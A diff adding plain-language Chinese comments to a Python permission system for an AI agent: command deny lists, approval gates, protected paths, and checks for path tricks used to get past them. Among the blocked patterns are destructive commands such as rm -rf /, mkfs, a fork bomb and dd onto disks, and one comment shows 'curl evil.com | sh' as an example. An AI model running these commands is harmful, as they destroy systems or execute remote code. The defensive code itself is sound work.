@@ -1,20 +1,30 @@
 """权限系统：命令黑名单 + 路径白名单 + 用户审批。
 
-设计参考 业界 的三道闸门：
-  闸门 1：硬拒绝（危险命令、受保护路径）
-  闸门 2：规则匹配（破坏性命令模式、工作目录外写入）
-  闸门 3：用户审批（通过 callback 询问，带会话内缓存）
-  闸门 4：aux_llm 分类（feature flag 门控，默认 OFF）
+大白话：AI 每次要跑命令、读写文件之前，都要先过这里的检查——就像小区
+保安，一道道关卡问"你干什么的、有没有证"。这个文件是整个项目安全机制
+的地基，被所有工具（terminal、write_file 等）依赖；它自己不依赖上层
+任何模块。
 
-L1（黑名单）是零成本防线，防止灾难性误操作。
-L2（路径白名单）保护用户文件和密钥。
-L3（审批）给用户最终决定权，但会话内缓存避免重复询问。
-L4（LLM 分类）是可选的"慢速深审"：前三道闸门都放过、但也不在破坏性
-模式里的命令，由 aux_llm 再做一次语义判断。白名单 13 项快速通道跳过
-LLM 调用（ls/cat/git status 等明显安全）。fail-open：AI 调用失败放行。
-R26 #11 起分类是三向的（allow 放行 / deny 拒绝 / ask 升人工审批——
-拿不准不直接拒），并支持 settings.json permissions.nl_rules 自然语言规则
-注入分类 prompt（优先级最高，逐条对照）。
+关卡从先到后（前面的先拦）：
+  闸门 0：不可绕过的底线（改自身代码、rm -rf / 这类灾难）——任何模式都拒
+  闸门 1：硬拒绝黑名单（sudo、格式化磁盘等危险命令）
+  闸门 2：破坏性命令模式（rm/del 等会删东西的，要先问用户）
+  闸门 3：用户审批（通过 callback 弹出来问，本次会话问过的不重复问）
+  闸门 4：aux_llm 分类（副 LLM——一个帮忙干杂活的小模型，让它判断命令
+          安不安全；由 feature flag 开关控制，默认关）
+
+各层的价值：
+- 黑名单（闸门 1）是零成本防线，先挡住灾难性误操作；
+- 路径白名单保护用户文件和密钥（写文件只准写工作目录和 ~/.OmniMate）；
+- 审批给用户最终决定权，会话内缓存避免同一个问题反复问；
+- LLM 分类（闸门 4）是可选的"慢速深审"：前三关都放过了、也不在破坏性
+  模式里的命令，再让副 LLM 从语义上判一次。配置里的白名单命令直接走
+  快速通道（ls/cat/git status 这类明显安全的，0 次 LLM 调用）。容错方式
+  是 fail-open（AI 调用失败就放行，别把用户卡死）。
+  R26 #11 起分类结果有三个方向（allow 放行 / deny 拒绝 / ask 升人工审批
+  ——拿不准时问人，不直接拒），还支持 settings.json permissions.nl_rules
+  里的自然语言规则（如"不允许动 docker"），会拼进分类提示词里，优先级
+  最高、逐条对照。
 """
 import asyncio
 import json
@@ -32,21 +42,22 @@ from agent.bash_injection import check_injection_surface
 
 
 # ---------------------------------------------------------------------------
-# 结果类型
+# 检查结果类型（所有闸门统一返回这个）
 # ---------------------------------------------------------------------------
 logger = logging.getLogger(__name__)
 @dataclass
 class PermissionResult:
+    """一次权限检查的结果：允不允许、为什么、是哪道关卡给的结论。"""
     allowed: bool
     reason: str
-    gate: str = ""  # "deny" / "protected" / "approval" / "ok"
+    gate: str = ""  # 给出结论的关卡："deny" / "protected" / "approval" / "ok" 等
 
 
 # ---------------------------------------------------------------------------
 # 闸门 1：命令硬拒绝黑名单
 # ---------------------------------------------------------------------------
 
-# 每条 (正则, 说明)。正则用 IGNORECASE 匹配。
+# 每条 (正则, 拒绝说明)。正则按忽略大小写匹配。
 _DENY_COMMAND_PATTERNS: List[Tuple[str, str]] = [
     # 删除根目录/家目录
     (r"\brm\s+-rf?\s+/(?:\s|$|\*)", "rm -rf 根目录"),
@@ -81,7 +92,7 @@ _DENY_COMMAND_PATTERNS: List[Tuple[str, str]] = [
     (r"\bgit\s+push\b.*(?:--force|-f)\b.*\b(?:main|master)\b", "强推主分支"),
     (r"\bgit\s+push\b.*\b(?:main|master)\b.*(?:--force|-f)\b", "强推主分支"),
 ]
-# 模块加载时预编译（避免每次 check 都查 re._cache）
+# 模块加载时预编译成正则对象（省得每次 check 都重新编译）
 _DENY_COMMAND_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
     (re.compile(pat, re.IGNORECASE), desc)
     for pat, desc in _DENY_COMMAND_PATTERNS
@@ -89,9 +100,13 @@ _DENY_COMMAND_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
 
 
 def check_command_deny(command: str) -> Optional[str]:
-    """闸门 1：检查命令是否命中硬拒绝黑名单。
+    """闸门 1：检查命令是否命中硬拒绝黑名单（命中就直接拒，不问用户）。
 
-    返回匹配的说明（拒绝原因），未命中返回 None。
+    参数：
+        command: 待检查的 shell 命令字符串。
+
+    返回：命中时返回那条黑名单的说明文字（可作为拒绝原因展示）；
+    没命中返回 None。
     """
     for pattern, desc in _DENY_COMMAND_PATTERNS_COMPILED:
         if pattern.search(command):
@@ -104,14 +119,21 @@ def check_command_deny(command: str) -> Optional[str]:
 # ---------------------------------------------------------------------------
 
 def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional[str]:
-    """闸门 0:禁止 agent 修改 OmniMate 自身的依赖。
+    """闸门 0 的一半：不许 AI 修改 OmniMate 自己的依赖。
 
-    只保护 OmniMate 自己的代码目录(project_root),不保护用户项目:
-    - cwd 在 OmniMate 自身目录内:uv add / pip install 拒绝(防止改坏自身依赖)
-    - cwd 在用户项目里:装依赖是改代码的正当工作,一律放行
-      (用户项目不一定是 Python:前端项目用 npm/pnpm/yarn,Python 项目用 uv/pip)
+    干什么：AI 在 OmniMate 自己的代码目录里跑 uv add / pip install 就拒绝。
 
-    返回拒绝原因,未命中返回 None。
+    为什么需要：AI 改自己的依赖等于"给自己动手术"——pyproject.toml 被改坏
+    或 venv 被污染后，整个助手直接瘫痪。只保护 OmniMate 自己的目录
+    （project_root），不限制用户项目：在用户项目里装依赖是干活的正当操作，
+    一律放行（用户项目也未必是 Python——前端用 npm/pnpm/yarn，Python 用
+    uv/pip）。
+
+    参数：
+        command: 待检查的命令字符串。
+        cwd: 当前工作目录；不传就跳过检查。
+
+    返回：命中时返回拒绝原因文字，没命中返回 None。
     """
     if not cwd:
         return None
@@ -122,7 +144,7 @@ def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional
     except Exception:
         return None
 
-    # 只在 OmniMate 自身目录内才拦截
+    # 只在 OmniMate 自己的目录里才拦
     in_self = cwd_resolved == root
     if not in_self:
         try:
@@ -143,20 +165,21 @@ def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional
 # ---------------------------------------------------------------------------
 # 不可绕过的系统级破坏（即使 bypassPermissions 也拒）
 # ---------------------------------------------------------------------------
-# 这组模式与 _DENY_COMMAND_PATTERNS 的区别:
-# - _DENY_COMMAND_PATTERNS(闸门 1) 在 bypassPermissions 模式下被跳过
-# - _FATAL_IRREVERSIBLE_PATTERNS(闸门 0 的子检查) 在任何模式下都拒绝,
-#   作为不可绕过的"硬底线",保护系统不被彻底破坏
+# 这组模式与上面的 _DENY_COMMAND_PATTERNS 的区别:
+# - _DENY_COMMAND_PATTERNS(闸门 1) 在 bypassPermissions(跳过所有审批)模式下不生效
+# - _FATAL_IRREVERSIBLE_PATTERNS(闸门 0 的子检查) 任何模式下都拒绝——
+#   是绕不过去的"硬底线",保住系统不被彻底搞坏
 _FATAL_IRREVERSIBLE_PATTERNS: List[str] = [
-    # rm -rf / 根目录(递归删整个文件系统)
-    # 注意:必须只命中"根目录",不能误伤 /home /tmp/x 等子路径。
-    # 拆成两条:第一条匹配 rm -rf / 后紧跟空格或行尾(排除 /home 等非根路径);
-    # 第二条专门兜底显式 --no-preserve-root(无论后面还有什么参数,都是致命的)。
+# rm -rf / 根目录(递归删掉整个文件系统)
+    # 注意:只能命中"根目录本身",不能误伤 /home、/tmp/x 这类子路径。
+    # 拆成两条:第一条要求 rm -rf / 后面紧跟空格或行尾(排除 /home 等非根路径);
+    # 第二条专门兜底显式的 --no-preserve-root(都写这个参数了,无论后面跟
+    # 什么都是致命操作)。
     r"\brm\s+-rf\s+/(?:\s|$)",
     r"\brm\s+-rf\s+/\s+--no-preserve-root",
     r"\bmkfs\b",                                    # mkfs 格式化文件系统
-    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;",        # fork bomb :(){ :|:& };(容忍空格变体)
-    r"\bdd\s+if=.*of=/dev/[sh]d",                   # dd 覆盖磁盘设备
+    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;",        # fork bomb :(){ :|:& };(自我复制的死循环,拖垮整机;容忍空格变体)
+    r"\bdd\s+if=.*of=/dev/[sh]d",                   # dd 直接往物理磁盘设备写数据(整盘覆盖)
 ]
 _FATAL_IRREVERSIBLE_RE: List["re.Pattern"] = [
     re.compile(p) for p in _FATAL_IRREVERSIBLE_PATTERNS
@@ -164,16 +187,21 @@ _FATAL_IRREVERSIBLE_RE: List["re.Pattern"] = [
 
 
 def check_fatal_irreversible(command: str) -> Optional[str]:
-    """检查系统级不可逆破坏命令(bypassPermissions 也无法绕过)。
+    """检查系统级不可逆破坏命令(bypassPermissions 也绕不过去)。
 
-    这是整个权限系统中唯一"绝对不可绕过"的硬底线。即使在
-    bypassPermissions 模式下,这些命令也会被拒绝,因为它们会导致:
-    - 整个文件系统被删除(rm -rf /)
+    干什么:比对硬底线黑名单——整个权限系统里唯一"绝对不可绕过"的检查。
+
+    为什么需要:即使用户选了"跳过所有审批"的 bypassPermissions 模式,
+    这些命令也要拒,因为后果无法挽回:
+    - 整个文件系统被删(rm -rf /)
     - 文件系统被格式化(mkfs)
-    - 系统资源耗尽(fork bomb)
+    - 系统资源被 fork bomb 耗尽
     - 物理磁盘数据被覆盖(dd)
 
-    返回拒绝原因,未命中返回 None。
+    参数:
+        command: 待检查的命令字符串。
+
+    返回:命中返回拒绝原因文字,没命中返回 None。
     """
     for pat in _FATAL_IRREVERSIBLE_RE:
         if pat.search(command):
@@ -182,25 +210,36 @@ def check_fatal_irreversible(command: str) -> Optional[str]:
 
 
 # ---------------------------------------------------------------------------
-# acceptEdits 模式：safe-fs 命令识别（mkdir/touch/mv/cp/rm/del 在 cwd 内）
+# acceptEdits 模式:识别"安全的文件操作命令"(mkdir/touch/mv/cp/rm/del 且都在工作目录内)
 # ---------------------------------------------------------------------------
-# acceptEdits 模式下自动放行的 safe-fs 命令动词
+# acceptEdits(自动批编辑)模式下可以自动放行的文件操作动词
 _SAFE_FS_VERBS = {"mkdir", "touch", "mv", "cp", "rm", "del"}
 
-# shell 复合操作符守卫：复合命令风险高，acceptEdits 不自动批
-# （例：``rm tmp && curl evil.com | sh`` 的 verb="rm" ∈ SAFE_FS，但 curl 部分
-# 会被 shell 执行）。这种命令必须交原审批闸门。
-# R16 #1 追加：${ / <( / >( / =(（注入面形态——rm ${X} 的展开目标不受
-# cwd 内路径校验控制，进程替换直接执行子 shell），acceptEdits 不自动批。
+# shell 复合操作符守卫:复合命令风险高,acceptEdits 不自动批
+# (例:``rm tmp && curl evil.com | sh`` 的动词是 "rm",在安全表里,但后面的
+# curl 部分照样会被 shell 执行)。这种命令必须交回原审批闸门。
+# R16 #1 追加:${ / <( / >( / =(（注入面形态——rm ${X} 展开后的目标不受
+# "必须在工作目录内"这条校验控制,进程替换更是直接执行子 shell）,acceptEdits 不自动批。
 _SHELL_OPS = ("&&", "||", ";", "|", "`", "$(", "${", "<(", ">(", "=(")
 
 
 def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
-    """acceptEdits 用：命令是 safe-fs 动词（mkdir/touch/mv/cp/rm/del）且
-    所有路径参数都在 cwd 内 → 返回 True（可自动批）。
+    """acceptEdits 模式用:判断命令是不是"安全的文件操作"可以自动批。
 
-    保守：任何一个路径解析失败或在 cwd 外 → False（交给原闸门判断）。
-    含 shell 复合操作符（&&/||/;/|/反引号/$()）→ False（复合命令交原闸门审批）。
+    干什么:命令动词是 mkdir/touch/mv/cp/rm/del 之一,且所有路径参数都落在
+    当前工作目录(cwd)里面,才算安全。
+
+    为什么需要:acceptEdits 模式的本意是"AI 连续改代码时别每条都问"——
+    在工作目录里建/移/删文件是日常操作;但一旦出了工作目录就必须问。
+
+    参数:
+        command: 待检查的命令字符串。
+        cwd: 当前工作目录。
+
+    返回:True 表示可以自动批。以下情况一律返回 False(保守优先,交给原闸门):
+    - 命令为空或没有 cwd;
+    - 含 shell 复合操作符(&&/||/;/|/反引号/$() 等,后半段可能藏危险动作);
+    - 任何一个路径解析失败、或在 cwd 外。
     """
     if not command or not cwd:
         return False
@@ -209,7 +248,7 @@ def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
     parts = command.split()
     if not parts:
         return False
-    # 取动词（处理 /usr/bin/mkdir 这种绝对路径形式）
+    # 取命令动词(兼容 /usr/bin/mkdir 这种绝对路径形式,只留最后一段)
     verb = parts[0].replace("\\", "/").split("/")[-1].lower()
     if verb not in _SAFE_FS_VERBS:
         return False
@@ -219,7 +258,7 @@ def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
         return False
     for tok in parts[1:]:
         if tok.startswith("-"):
-            continue  # flag（如 -rf, -p）
+            continue  # 是选项参数(如 -rf、-p),不是路径,跳过
         if not tok:
             continue
         try:
@@ -234,7 +273,7 @@ def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
             resolved = p.resolve() if p.is_absolute() else (cwd_path / p).resolve()
             resolved.relative_to(cwd_path)  # 不在 cwd 下会抛 ValueError
         except (ValueError, OSError, RuntimeError):
-            return False  # 路径在 cwd 外或解析失败 → 不自动批
+            return False  # 路径在 cwd 外或解析失败 → 保守起见不自动批
     return True
 
 
@@ -242,10 +281,10 @@ def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
 # 闸门 2：破坏性命令模式（需用户审批才能执行）
 # ---------------------------------------------------------------------------
 
-# 这些命令本身不是灾难性的（不在硬拒绝黑名单），但会造成文件删除/覆盖，
-# 应该让用户确认。审批 callback 在 cli.py 注入（用 console.input 问 y/n）。
+# 这些命令本身不算灾难(够不上硬拒绝黑名单),但会删/覆盖文件,
+# 应该先问用户。审批 callback 由 cli.py 注入(在终端里问 y/n)。
 _DESTRUCTIVE_PATTERNS: List[Tuple[str, str]] = [
-    (r"\brm\s+(?!-rf?\s+/(?:\s|$|\*))(?!-rf?\s+~)", "rm 删除"),  # rm 但非根目录
+    (r"\brm\s+(?!-rf?\s+/(?:\s|$|\*))(?!-rf?\s+~)", "rm 删除"),  # rm,但排除根目录/家目录(那俩在更前面的闸门)
     (r"\bdel\s+", "del 删除"),
     (r"\brmdir\s+", "rmdir 删目录"),
     (r"\berase\s+", "erase 删除"),
@@ -262,9 +301,12 @@ _DESTRUCTIVE_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
 
 
 def check_destructive(command: str) -> Optional[str]:
-    """闸门 2：检查命令是否是破坏性操作（需要审批）。
+    """闸门 2:检查命令是否是破坏性操作(是就要先问用户)。
 
-    返回匹配的说明，未命中返回 None。
+    参数:
+        command: 待检查的命令字符串。
+
+    返回:命中返回匹配到的说明文字(展示给用户的审批理由),没命中返回 None。
     """
     for pattern, desc in _DESTRUCTIVE_PATTERNS_COMPILED:
         if pattern.search(command):
@@ -299,29 +341,35 @@ _PROTECTED_PATHS = [
     "C:\\Program Files",
     "C:\\Program Files (x86)",
 ]
-# 模块加载时预计算（避免每次 safe_path 都 14× resolve）
+# 模块加载时预先算好绝对路径(免得每次 safe_path 都重复对 14 条路径做 resolve)
 _PROTECTED_PATHS_RESOLVED: List[Tuple[Path, str]] = []
 for _p in _PROTECTED_PATHS:
     try:
         _PROTECTED_PATHS_RESOLVED.append((Path(_p).expanduser().resolve(), _p))
     except (OSError, ValueError):
-        # 解析失败的条目跳过（极少数环境下可能发生）
+        # 解析失败的条目跳过(极少数环境下才发生)
         continue
 
 
 def _path_forms_for_check(path) -> List[Path]:
-    """R16 #5 双路径检查：返回要过安全检查的路径形式列表。
+    """R16 #5 双路径检查:算出这个路径要过安全检查的"两种写法"。
 
-    对齐 CCB getPathsForPermissionCheck 的语义——同一输入产生
-    「原始词法形式（expanduser + normpath，不解析软链）」和
-    「解析形式（realpath，软链全展开）」两个候选：
+    干什么:同一个路径,给出两个候选形式——
+    「原始写法」(只做 ~ 展开和 normpath 规范化,不解析软链)和
+    「真实写法」(realpath,把软链一路展开到最终指向)。
 
-    - 防软链指向 ~/.ssh 等保护目标（词法形式无害、解析形式才暴露）
-    - 反向防"解析后脱离保护表、词法仍在保护下"的形态
-    - 词法形式还覆盖 realpath 失败（如不存在的目标）时保护判定不断轨
+    为什么需要(对齐 CCB 的 getPathsForPermissionCheck 语义):
+    - 防软链绕过:表面路径无害,实际软链指向 ~/.ssh 这类保护目标,
+      只有"真实写法"能暴露;
+    - 反向防护:解析后脱离了保护表、但原始写法还在保护下的形态;
+    - 原始写法还能兜底 realpath 失败(比如目标不存在)时保护判定失灵。
 
-    解析整体失败返回空列表（与旧 fail-open 语义一致，safe_path 写路径
-    仍会因白名单解析失败而 fail-closed）。
+    参数:
+        path: 任意可转成字符串的路径。
+
+    返回:候选路径列表(两种写法相同时只有一个)。解析整体失败返回空列表
+    (与旧的 fail-open 语义一致——但注意写路径在 safe_path 的白名单处
+    解析失败仍会 fail-closed 拒绝)。
     """
     forms: List[Path] = []
     try:
@@ -343,17 +391,25 @@ def _path_forms_for_check(path) -> List[Path]:
 
 
 def is_protected_path(path) -> Optional[str]:
-    """检查路径是否在受保护列表（读写都拒绝）。
+    """检查路径是否撞上受保护列表(读写都拒)。
 
-    R16 #5：词法 + realpath 双形式都过保护表（防软链绕过）。
+    干什么:拿路径的两种写法(见 _path_forms_for_check)逐条对照保护表。
 
-    返回匹配的保护项（拒绝原因），未命中返回 None。
+    为什么需要:保护 ~/.ssh、/etc、C:\\Windows 这类碰不得的地方;两种
+    写法都查(R16 #5,防软链绕过——软链指向 ~/.ssh 时只有 realpath 形式
+    会暴露)。
+
+    参数:
+        path: 待检查的路径。
+
+    返回:命中时返回保护表里的原始条目(如 "~/.ssh",可作拒绝原因展示),
+    没命中返回 None。
     """
     for form in _path_forms_for_check(path):
         for prot, orig in _PROTECTED_PATHS_RESOLVED:
             if form == prot:
                 return orig
-            # path 在 protected 下
+            # path 落在保护目录的下层子路径里也算命中
             try:
                 form.relative_to(prot)
                 return orig
@@ -363,7 +419,7 @@ def is_protected_path(path) -> Optional[str]:
 
 
 # ---------------------------------------------------------------------------
-# 写保护路径（只禁写,允许读——agent 可以读项目代码,但不能改）
+# 写保护路径(只禁写,不禁读——AI 可以读 OmniMate 的项目代码,但不能改)
 # ---------------------------------------------------------------------------
 
 _WRITE_PROTECTED_PATHS: List[Tuple[Path, str]] = []
@@ -377,8 +433,15 @@ except Exception:
 def is_write_protected_path(path) -> Optional[str]:
     """检查路径是否在写保护列表(只禁写,不禁读)。
 
-    用于防止 agent 修改项目自身的代码。
-    R16 #5：词法 + realpath 双形式都过保护表（防软链绕过）。
+    干什么:判断路径是否落在 OmniMate 自身代码目录里。
+
+    为什么需要:防 AI 改自己的源码(相当于自我篡改)。R16 #5:路径的两种
+    写法(词法/realpath)都过保护表,防软链绕过。
+
+    参数:
+        path: 待检查的路径。
+
+    返回:命中返回保护项说明文字,没命中返回 None。
     """
     for form in _path_forms_for_check(path):
         for prot, orig in _WRITE_PROTECTED_PATHS:
@@ -393,47 +456,61 @@ def is_write_protected_path(path) -> Optional[str]:
 
 
 # ---------------------------------------------------------------------------
-# R16 #2：可疑路径形态检测（Windows 绕过手法，全平台检测）
+# R16 #2:可疑路径形态检测(各种"改名绕过安检"的花招,全平台都查)
 # ---------------------------------------------------------------------------
 
-# 8.3 短名（GIT~1 / SETTIN~1.JSON / BASHRC~1）
+# 8.3 短名(WINDOWS 的老式缩写文件名,如 GIT~1 / SETTIN~1.JSON——和全名
+# 指向同一个文件,但字符串对不上,能绕过按名字匹配的检查)
 _SHORT_NAME_RE = re.compile(r"~\d")
-# 长路径前缀（\\?\ / \\.\ 及正斜杠变体 //?/ //./）
+# 长路径前缀(\\\\?\\ / \\\\.\\ 及正斜杠变体——能突破 260 字符限制,
+# 也让按前缀/后缀匹配的检查失效)
 _LONG_PATH_PREFIXES = ("\\\\?\\", "\\\\.\\", "//?/", "//./")
-# 尾点/尾空格（Windows 解析时剥离 → ".git." 绕过 ".git" 字符串匹配）
+# 尾点/尾空格(Windows 解析时会把结尾的点和空格悄悄剥掉——
+# ".git." 实际就是 ".git",但字符串匹配对不上)
 _TRAILING_DOT_SPACE_RE = re.compile(r"[.\s]+$")
-# DOS 设备名作扩展名（.git.CON / settings.json.PRN / .bashrc.AUX）
+# DOS 设备名当扩展名(.git.CON / settings.json.PRN / .bashrc.AUX——
+# 这些老设备名在 WINDOWS 里有特殊含义,解析行为不可预期)
 _DOS_DEVICE_EXT_RE = re.compile(
     r"\.(?:CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$", re.IGNORECASE
 )
-# 三连点及以上作为独立路径段（.../file.txt 或 path/.../file；
-# 只拦"前后都是分隔符或端点"的段形态，放行 [...] 这类合法命名）
+# 三连点及以上的独立路径段(.../file.txt 或 path/.../file;
+# 只拦"前后都是分隔符或端点"的完整段,放过 [...] 这种合法文件名)
 _TRIPLE_DOT_SEGMENT_RE = re.compile(r"(?:^|[/\\])\.{3,}(?:[/\\]|$)")
-# 波浪变体（~user / ~+ / ~- / ~N——非 "~" 与 "~/" 起头的形态；
-# shell 展开目标（~root → /var/root）与校验目标（当相对路径）不一致）
+# 波浪变体(~user / ~+ / ~- / ~N——凡是不是 "~" 或 "~/" 开头的波浪形态;
+# shell 展开的目标(~root → /var/root)和校验时当相对路径看的目标不一致)
 _TILDE_VARIANT_RE = re.compile(r"^~(?![/\\]|$)")
-# glob 元字符（写路径禁止：写工具按字面使用路径，通配符只会绕过校验）
+# glob 通配符(写路径禁止:写工具按字面用路径,通配符只会被用来绕过校验)
 _GLOB_META_RE = re.compile(r"[*?\[\]{}]")
 
 
 def check_suspicious_path(path, *, write: bool = False) -> Optional[str]:
-    """R16 #2：检测可用于绕过安全检查的可疑路径形态（命中即拒）。
+    """R16 #2:检测可用于绕过安全检查的可疑路径形态(查到就拒)。
 
-    对齐 CCB hasSuspiciousWindowsPathPattern + pathValidation 的波浪变体 /
-    写路径 glob 禁令，且按 CC 同样理由**全平台检测**（NTFS 可挂载于任意 OS，
-    短名/长前缀等绕过手法在 ntfs-3g 挂载的 Linux/macOS 上同样生效）：
+    干什么:看路径字符串里有没有"改名绕过安检"的花招(NTFS 特性、
+    短文件名、尾点等)。
 
-    - NTFS ADS 冒号（file.txt:stream，仅 win32——POSIX 冒号是合法文件名字符）
-    - 8.3 短名（GIT~1）
-    - 长路径前缀（\\\\?\\ / \\\\.\\）
-    - 尾点/尾空格（Windows 解析时剥离）
-    - DOS 设备名扩展（CON/PRN/AUX/NUL/COM1-9/LPT1-9）
-    - 三连点路径段（.../file）
-    - UNC 路径（\\\\server\\share——远程资源访问 + 凭证泄露 + 绕过工作目录限制）
-    - 波浪变体（~user / ~+ / ~N）
-    - glob 元字符（仅写路径；读路径的 glob 由 glob 工具自己展开）
+    为什么需要:就算保护表和白名单都写对了,这些特殊写法能让同一个
+    文件呈现出完全不同的字符串,安检就对不上了。对齐 CCB 的
+    hasSuspiciousWindowsPathPattern + 波浪变体/写路径 glob 禁令,且按
+    CC 同样的理由**全平台都查**(NTFS 磁盘可以挂载在任何系统上,这些
+    花招在 Linux/macOS 的 ntfs-3g 挂载下一样好使):
+    - NTFS ADS 冒号(file.txt:stream,仅 win32——POSIX 里冒号是合法
+      文件名字符,不能拦)
+    - 8.3 短名(GIT~1)
+    - 长路径前缀(\\\\?\\ / \\\\.\\)
+    - 尾点/尾空格(Windows 解析时剥掉)
+    - DOS 设备名扩展(CON/PRN/AUX/NUL/COM1-9/LPT1-9)
+    - 三连点路径段(.../file)
+    - UNC 路径(\\\\server\\share——访问远程资源 + 可能泄露凭证 +
+      绕过工作目录限制)
+    - 波浪变体(~user / ~+ / ~N)
+    - glob 通配符(仅写路径;读路径的通配符由 glob 工具自己展开)
 
-    返回拒绝原因（中文说明），未命中返回 None。
+    参数:
+        path: 待检查的路径。
+        write: 是否写操作(写操作额外拦通配符)。
+
+    返回:命中返回中文拒绝原因,没命中返回 None。
     """
     try:
         s = str(path)
@@ -442,15 +519,15 @@ def check_suspicious_path(path, *, write: bool = False) -> Optional[str]:
     if not s:
         return None
 
-    # 长路径前缀先于 ADS 冒号检查（\\?\C:\ 里的冒号是盘符不是 ADS）
+    # 长路径前缀要先于 ADS 冒号检查(\\?\C:\ 里的冒号是盘符,不是 ADS)
     if s.startswith(_LONG_PATH_PREFIXES):
         return "长路径前缀（\\\\?\\ / \\\\.\\）"
-    # NTFS ADS 冒号：跳过盘符冒号（C:\ 在位置 1），从位置 2 起找
+    # NTFS ADS 冒号:跳过盘符冒号(C:\ 的冒号在位置 1),从位置 2 起找
     if sys.platform == "win32" and s.find(":", 2) != -1:
         return "NTFS ADS 冒号形态（file:stream）"
     if _SHORT_NAME_RE.search(s):
         return "8.3 短名形态（NAME~1）"
-    # 尾点/尾空格：只看最后一个路径段（裸 "."/".." 是目录引用，放行）
+    # 尾点/尾空格:只看最后一个路径段(裸 "."/".." 是目录引用,放行)
     _last_seg = re.split(r"[/\\]", s)[-1]
     if _last_seg and _last_seg not in (".", "..") and _TRAILING_DOT_SPACE_RE.search(_last_seg):
         return "尾点/尾空格（Windows 解析时剥离，可绕过路径匹配）"
@@ -471,16 +548,21 @@ def check_suspicious_path(path, *, write: bool = False) -> Optional[str]:
 # 路径白名单（写操作检查）
 # ---------------------------------------------------------------------------
 
-# 运行时额外白名单（/add-dir 命令追加；进程级，重启靠 config 持久化 + 启动加载）。
-# 注意：受保护路径（~/.ssh / /etc 等）和项目代码写保护在 safe_path 里先于
-# 白名单检查——追加白名单不能绕过这些硬底线（安全默认 > 事后补救）。
+# 运行时额外白名单(用户用 /add-dir 命令追加的目录;只活在当前进程,
+# 重启后靠 settings.json 持久化 + 启动加载恢复)。
+# 注意:受保护路径(~/.ssh / /etc 等)和项目代码写保护在 safe_path 里排在
+# 白名单**前面**——往白名单加目录不能绕过这些硬底线(安全默认优先,
+# 出了事再补救就晚了)。
 _EXTRA_ALLOWED_ROOTS: List[Path] = []
 
 
 def add_extra_allowed_root(root) -> bool:
-    """运行时追加 safe_path 写白名单根目录（幂等）。
+    """运行时往写白名单追加一个根目录(已存在就不再加,幂等)。
 
-    返回 True 表示新增，False 表示已存在（去重，不重复加）。
+    参数:
+        root: 要追加的目录路径。
+
+    返回:True 表示新加了一条;False 表示它已经在白名单里(去重)。
     """
     resolved = Path(root).expanduser().resolve()
     if resolved in _EXTRA_ALLOWED_ROOTS:
@@ -490,7 +572,7 @@ def add_extra_allowed_root(root) -> bool:
 
 
 def list_extra_allowed_roots() -> List[Path]:
-    """列出运行时追加的额外白名单（拷贝，防外部改内部列表）。"""
+    """列出运行时追加的额外白名单(返回拷贝,外部改不到内部列表)。"""
     return list(_EXTRA_ALLOWED_ROOTS)
 
 
@@ -500,9 +582,12 @@ def clear_extra_allowed_roots() -> None:
 
 
 def remove_extra_allowed_root(root) -> bool:
-    """运行时移除一条额外白名单（T5 /approved remove-root 用）。
+    """运行时从额外白名单里移除一条(T5 的 /approved remove-root 命令用)。
 
-    返回 True 表示移除成功，False 表示不在白名单中。
+    参数:
+        root: 要移除的目录路径。
+
+    返回:True 表示移除成功;False 表示它本来就不在白名单里。
     """
     resolved = Path(root).expanduser().resolve()
     if resolved in _EXTRA_ALLOWED_ROOTS:
@@ -512,11 +597,18 @@ def remove_extra_allowed_root(root) -> bool:
 
 
 def default_allowed_roots() -> List[Path]:
-    """默认允许写入的根目录：cwd + ~/.OmniMate + /add-dir 追加的额外白名单。
+    """算出默认允许写入的根目录列表:工作目录 + ~/.OmniMate + /add-dir 追加的额外白名单。
 
-    Round 1 fix: Path.cwd() 是进程级（=os.getcwd），并发子代理会踩到别人的 cwd。
-    改走 get_workspace_cwd()（线程局部 ContextVar），子代理在自己 worktree 内
-    写文件时白名单会包含 worktree 路径，不会被 safe_path 拒绝。
+    为什么是这三处:工作目录是用户项目的地盘,~/.OmniMate 是 AI 自己的家
+    (记忆/技能等数据),/add-dir 是用户显式授权的额外目录。
+
+    历史踩坑(Round 1 修复):Path.cwd() 是进程级的(等于 os.getcwd)——
+    多个子代理(主对话派出去干活的分身)并发跑时,一个切了目录,别的都
+    会踩到别人的工作目录。所以改用 get_workspace_cwd()(线程私有的
+    ContextVar 变量):子代理在自己的 worktree(git 工作副本)里写文件时,
+    白名单里包含的是它自己的 worktree 路径,不会被 safe_path 误拒。
+
+    返回:Path 列表(无参数)。
     """
     from agent.workspace_context import get_workspace_cwd
     roots = [Path(get_workspace_cwd()).resolve()]
@@ -525,7 +617,8 @@ def default_allowed_roots() -> List[Path]:
         roots.append(get_omnimate_home().resolve())
     except Exception:
         pass
-    # CCAR11 Task 4: /add-dir 运行时追加的额外白名单（含启动时从 config 加载的）
+    # CCAR11 Task 4 补的:/add-dir 运行时追加的额外白名单(含启动时从
+    # settings.json 里加载回来的)
     roots.extend(_EXTRA_ALLOWED_ROOTS)
     return roots
 
@@ -536,19 +629,29 @@ def safe_path(
     write: bool = False,
     allowed_roots: Optional[List] = None,
 ) -> PermissionResult:
-    """检查路径是否安全可访问。
+    """检查一个路径是否允许访问(模块级函数版,不带审批;要弹窗问用户的走 PermissionChecker.check_path)。
 
-    读：不在 _PROTECTED_PATHS 即可。
-    写：不在 _PROTECTED_PATHS 且在 allowed_roots 之一下。
+    干什么:按顺序过三关——可疑形态、受保护路径、(写操作时)写保护+白名单。
 
-    返回 PermissionResult。
+    规则:
+    - 读:不在 _PROTECTED_PATHS(密钥/系统目录)里就放行;
